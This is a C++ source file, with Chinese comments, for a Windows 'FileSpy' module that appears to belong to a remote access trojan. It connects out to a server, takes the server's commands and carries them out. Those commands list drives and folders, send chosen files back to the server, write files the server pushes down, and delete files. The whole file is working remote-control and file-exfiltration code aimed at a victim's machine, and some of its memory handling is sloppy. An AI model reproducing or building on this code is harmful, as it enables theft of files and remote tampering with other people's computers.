#include "filespy.h"

// 初始化FileSpy
static FileSpy gSpy;

FileSpy::FileSpy()
{

}

void FileSpy::startByNewThread(std::string domain, int port)
{
    // 将域名和端口数据转换成一个字符指针类型
    char *args = new char[MAX_PATH+sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args,domain.data(), MAX_PATH);
    memcpy(args+MAX_PATH,(char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL,0, FileSpy::fileSpyThreadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD FileSpy::fileSpyThreadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH));

    // 开始监控
    startFileSpy(domain, port);

    // 释放参数
    delete (char *)args;
    return true;
}

void FileSpy::startFileSpy(std::string domain, int port)
{
    // 连接到服务器，接收服务器的指令
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server for file spy" << std::endl;
        std::fflush(stdout);
    }

    // 开始监控消息
    std::cout << "Started file spy" << std::endl;
    std::fflush(stdout);

    // 死循环，不断从服务端接收数据
    const int packetSize = 800;
    char szData[packetSize];
    int ret;
    std::string buf;

    while (1) {
        ret = sock.recvData(szData, packetSize);

        // 出现错误
        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

       // 把数据加入到缓冲区
       addDataToBuffer(&sock, buf, szData, ret);
    }

    // 完成
    std::cout << "Finished file spy" << std::endl;
    std::fflush(stdout);
}

void FileSpy::addDataToBuffer(TcpSocket *sock, std::string &buf, char *data, int size)
{
    buf.append(data,size);

    // 把数据转换成指令模式
    int endIndex;
    while ((endIndex = buf.find(gSpy.CmdEnd)) >= 0) {
        std::string line = buf.substr(0,endIndex);
        buf.erase(0, endIndex+gSpy.CmdEnd.length());

        // 获取指令
        int firstSplit = line.find(gSpy.CmdSplit);
        std::string cmd = line.substr(0, firstSplit);
        line.erase(0, firstSplit+gSpy.CmdSplit.length());

        // 处理指令
        processCmd(sock, cmd, line);
    }
}

std::map<std::string, std::string> FileSpy::parseArgs(std::string &data)
{
    // 字符串分割成列表
    std::vector<std::string> v;
    std::string::size_type pos1, pos2;
    pos2 = data.find(gSpy.CmdSplit);
    pos1 = 0;
    while(std::string::npos != pos2) {
        v.push_back(data.substr(pos1, pos2-pos1));
        pos1 = pos2 + gSpy.CmdSplit.size();
        pos2 = data.find(gSpy.CmdSplit, pos1);
    }
    if(pos1 != data.length()) v.push_back(data.substr(pos1));

    // 解析参数
    std::map<std::string, std::string> args;
    for (int i=0; i<(int)v.size()-1; i+=2) {
        args[v.at(i)] =  v.at(i+1);
    }

    return args;
}

void FileSpy::processCmd(TcpSocket *sock, std::string &cmd, std::string &data)
{
    // 解析参数
    std::map<std::string, std::string> args = parseArgs(data);

    // 获取文件
    if (cmd == gSpy.CmdGetDirFiles) {
        doGetDirFiles(sock, args);
        return;
    }

    // 下载文件
    if (cmd == gSpy.CmdDownloadFile) {
        doDownloadFile(sock, args);
        return;
    }

    // 上传文件
    if (cmd == gSpy.CmdUploadFile) {
        doUploadFile(sock, args);
        return;
    }

    // 删除文件
    if (cmd == gSpy.CmdDeleteFile) {
        doDeleteFile(sock ,args);
        return;
    }
}

void FileSpy::doGetDirFiles(TcpSocket *sock, std::map<std::string, std::string> &args)
{
    std::string dir = args["DIR"];
    std::string data;

    // 如果为空就代表获取盘符
    if (dir.size() == 0) {
        std::vector<std::string> drives;
        drives = getDrives();

        // 把盘符打包成数据
        data.append(gSpy.CmdSendDrives+gSpy.CmdSplit);
        data.append("DRIVES"+gSpy.CmdSplit);

        int max = drives.size();
        for (int i=0; i<max; ++i) {
            data.append(drives[i]+gSpy.CmdFileSplit);
        }
        if (drives.size() > 0) {
            data.erase(data.size()-1);
        }
        data.append(gSpy.CmdEnd);

        // 发送
        sock->sendData(data.data(), data.size());
    } else {
        std::vector<std::string> files;
        std::vector<std::string> dirs;

        dirs = getDirs(dir);
        files = getFiles(dir);

        // 把目录打包成数据
        data.append(gSpy.CmdSendDirs+gSpy.CmdSplit);
        data.append("DIR"+gSpy.CmdSplit+ dir +gSpy.CmdSplit);
        data.append("DIRS"+gSpy.CmdSplit);

        int max = dirs.size();
        for (int i=0; i<max; ++i) {
            data.append(dirs[i]+gSpy.CmdFileSplit);
        }
        if (dirs.size() > 0) {
            data.erase(data.size()-1);
        }
        data.append(gSpy.CmdEnd);

        // 把文件名打包成数据
        data.append(gSpy.CmdSendFiles+gSpy.CmdSplit);
        data.append("DIR"+gSpy.CmdSplit+ dir +gSpy.CmdSplit);
        data.append("FILES"+gSpy.CmdSplit);

        max = files.size();
        for (int i=0; i<max; ++i) {
            data.append(files[i]+gSpy.CmdFileSplit);
        }
        if (files.size()) {
            data.erase(data.size()-1);
        }
        data.append(gSpy.CmdEnd);

        // 发送
        sock->sendData(data.data(), data.size());
    }

}

void FileSpy::doDownloadFile(TcpSocket *sock, std::map<std::string, std::string> &args)
{
    // 发送文件到服务端
    std::string filePath = args["FILE_PATH"];
    int port = atoi(args["PORT"].data());

    // 开启一个新的线程发送文件
    startSendFileByNewThread(filePath, sock->mIp, port);
}

void FileSpy::doUploadFile(TcpSocket *sock, std::map<std::string, std::string> &args)
{
    // 从服务端接收文件
    std::string filePath = args["FILE_PATH"];
    int port = atoi(args["PORT"].data());

    // 开启一个线程接收文件
    startRecvFileByNewThread(filePath, sock->mIp, port);
}

void FileSpy::doDeleteFile(TcpSocket *sock, std::map<std::string, std::string> &args)
{
    // 删除文件
    bool  ret =  DeleteFileA(args["FILE_PATH"].data());
    std::string data;
    if (ret) {
        data.append(gSpy.CmdDeleteFileSuccess);
        data.append(gSpy.CmdEnd);
        sock->sendData(data.data(), data.size());
    } else {
        data.append(gSpy.CmdDeleteFileFailed);
        data.append(gSpy.CmdEnd);
        sock->sendData(data.data(), data.size());
    }
}

std::vector<std::string> FileSpy::getDrives()
{
    std::vector<std::string> drives;

    // 遍历a-z盘符
    for (int i='b'; i<='z'; i++) {
        char d[MAX_PATH];
        sprintf(d, "%c:\\*", i);

        WIN32_FIND_DATAA findData;
        HANDLE h = FindFirstFileA(d, &findData);
        if (h != INVALID_HANDLE_VALUE) {
            d[strlen(d)-1] = '\0';
            drives.push_back(d);

            // 释放句柄
            CloseHandle(h);
        }
    }

    return drives;
}

std::vector<std::string> FileSpy::getDirs(std::string dir)
{
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
    std::vector<std::string> files;

    if (hFind == INVALID_HANDLE_VALUE) {
        return files;
    }

    // 遍历目录来获取路径
    while (FindNextFileA(hFind, &findData)) {
        // 不需要后退和当前目录
        if(!strcmp(findData.cFileName,"..") || !strcmp(findData.cFileName,".")) {
            continue;
        }

        // 判断路径
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            files.push_back(findData.cFileName);
        }
    }

    // 释放句柄
    CloseHandle(hFind);

    return files;
}

std::vector<std::string> FileSpy::getFiles(std::string dir)
{
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
    std::vector<std::string> files;

    if (hFind == INVALID_HANDLE_VALUE) {
        return files;
    }

    // 遍历目录来获取文件
    while (FindNextFileA(hFind, &findData)) {
        // 不需要后退和当前目录
        if(!strcmp(findData.cFileName,"..") || !strcmp(findData.cFileName,".")) {
            continue;
        }

        // 判断不是路径
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            files.push_back(findData.cFileName);
        }
    }

    // 释放句柄
    CloseHandle(hFind);

    return files;
}

void FileSpy::startSendFileByNewThread(std::string filePath, std::string domain, int port)
{
    // 将文件路径，域名和端口数据转换成一个字符指针类型
    char *args = new char[MAX_PATH+MAX_PATH+sizeof(int)];

    filePath.reserve(MAX_PATH);
    memcpy(args, filePath.data(), MAX_PATH);

    domain.reserve(MAX_PATH);
    memcpy(args+MAX_PATH,domain.data(), MAX_PATH);

    memcpy(args+MAX_PATH+MAX_PATH,(char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL,0, FileSpy::sendFileThreadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD FileSpy::sendFileThreadProc(LPVOID args)
{
    // 将文件路径，域名和端口数据从指针转换过来
    char filePath[MAX_PATH], domain[MAX_PATH];
    memcpy(filePath, args, MAX_PATH);
    memcpy(domain, args+MAX_PATH, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH+MAX_PATH));

    // 开始发送文件
    startSendFile(filePath, domain, port);

    // 释放参数
    delete (char *)args;
    return true;
}

void FileSpy::startSendFile(std::string filePath, std::string domain, int port)
{
    // 连接到服务端发送文件
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // 打开文件
    FILE *fp = fopen(filePath.data(), "rb");
    if (!fp) {
        // 断开
        sock.dissconnect();

        std::cout << "Failed to open file for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // 获取文件大小
    fseek(fp, 0, SEEK_END);
    unsigned int len = ftell(fp);
    rewind(fp);

    // 获取文件名字
    char name[_MAX_FNAME], ext[_MAX_EXT];
    _splitpath(filePath.data(), NULL, NULL, name, ext);

    // 发送文件头
    FileHeader header;
    sprintf(header.fileName, "%s%s", name,ext);
    header.len = len;
    sock.sendData((char *)&header, sizeof(header));

    // 发送文件数据
    // 发送jpg数据包，包大小每次最好少于1000，我这里定义800
    const unsigned int paketLen = 800;
    char data[800];
    unsigned int pos = 0;

    while (pos < len) {
        int sendSize = (pos+paketLen) > len ? len-pos : paketLen;

        // 读取文件
        fread(data, 1, sendSize, fp);

        if (!sock.sendData(data, sendSize)) {
            return;
        }

        pos += sendSize;
    }

    // 关闭已经打开的文件
    fclose(fp);
}

void FileSpy::startRecvFileByNewThread(std::string filePath, std::string domain, int port)
{
    // 将文件路径，域名和端口数据转换成一个字符指针类型
    char *args = new char[MAX_PATH+MAX_PATH+sizeof(int)];

    filePath.reserve(MAX_PATH);
    memcpy(args, filePath.data(), MAX_PATH);

    domain.reserve(MAX_PATH);
    memcpy(args+MAX_PATH,domain.data(), MAX_PATH);

    memcpy(args+MAX_PATH+MAX_PATH,(char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL,0, FileSpy::recvFileThreadProc,(LPVOID)args,0,NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD FileSpy::recvFileThreadProc(LPVOID args)
{
    // 将文件路径，域名和端口数据从指针转换过来
    char filePath[MAX_PATH], domain[MAX_PATH];
    memcpy(filePath, args, MAX_PATH);
    memcpy(domain, args+MAX_PATH, MAX_PATH);
    int port = *((int*)((char*)args+MAX_PATH+MAX_PATH));

    // 开始接收
    startRecvFile(filePath, domain, port);

    // 释放参数
    delete (char *)args;
    return true;
}

void FileSpy::startRecvFile(std::string filePath, std::string domain, int port)
{    // 连接到服务端发送文件
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect server for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // 创建一个新的文件
    FILE *fp = fopen(filePath.data(), "wb");
    if (!fp) {
        // 断开
        sock.dissconnect();

        std::cout << "Failed to open file for send file" << std::endl;
        std::fflush(stdout);
        return;
    }

    // 开始接收数据
    const int packetLen = 800;
    char data[packetLen];
    while(1) {
        int ret = sock.recvData(data, packetLen);

        if (ret == SOCKET_ERROR || ret == 0) {
            break;
        }

        // 写入数据
        fwrite(data, 1, ret, fp);
    }

    // 关闭文件
    if (fp) {
        fclose(fp);
    }
}

